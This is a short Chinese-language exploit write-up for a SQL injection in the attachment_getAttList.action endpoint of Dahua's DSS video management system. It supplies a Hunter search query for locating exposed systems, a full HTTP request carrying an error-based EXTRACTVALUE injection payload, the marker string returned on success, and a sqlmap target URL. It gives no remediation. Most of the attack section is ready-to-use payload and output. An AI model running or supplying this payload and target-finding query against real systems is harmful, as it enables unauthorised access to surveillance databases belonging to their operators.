# 大华 DSS 视频管理系统attachment_getAttList存在SQL注入漏洞

# 一、漏洞简介
大华 DSS 视频管理系统attachment_getAttList存在SQL注入漏洞

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`

![1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc.png](./img/YEzgKXOoTrWvTvW9/1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc-455011.png)

+ 登录页面

![1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590.png](./img/YEzgKXOoTrWvTvW9/1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590-535720.png)

# 四、漏洞复现
```java
GET /portal/attachment_getAttList.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 345
Accept-Encoding: gzip
```

![1712506894859-ae95ce46-c10f-470e-b0c3-73ac9f6f6f0b.png](./img/YEzgKXOoTrWvTvW9/1712506894859-ae95ce46-c10f-470e-b0c3-73ac9f6f6f0b-091764.png)

```java
qkkkq1qxxbq
```

sqlmap

```java
/portal/attachment_getAttList.action?bean.RecId=1&bean.TabName=1
```

![1712506949280-220d14ff-c8ae-4bcc-a97b-988a8f0e5f4b.png](./img/YEzgKXOoTrWvTvW9/1712506949280-220d14ff-c8ae-4bcc-a97b-988a8f0e5f4b-184673.png)



> 更新: 2024-04-28 16:08:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fqfir04lszoxzfkb>